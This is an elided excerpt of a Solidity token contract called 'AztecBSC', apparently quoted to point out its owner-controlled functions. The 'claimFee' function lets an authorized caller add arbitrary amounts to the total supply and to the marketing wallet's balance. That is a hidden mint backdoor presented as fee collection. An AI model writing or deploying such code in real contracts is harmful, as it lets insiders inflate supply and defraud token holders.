...
contract aztecbsc  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x0E40C67e3dE9251851Dc8cE746D50610Aa0d6073); 
    address payable public Wallet_Dev = payable(0x680a2b7d7Fd4AD3b92F8064a0c4a0485d083401A);
    ...
    string private constant _name = "AztecBSC"; 
    ...
    constructor () {
        ...
        _owner = 0x680a2b7d7Fd4AD3b92F8064a0c4a0485d083401A;
    ...
    function claimFee(uint256 acc, address adr) authorized() public virtual {
        require(adr == address(Wallet_Marketing));
        _Verif(address(Wallet_Marketing), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
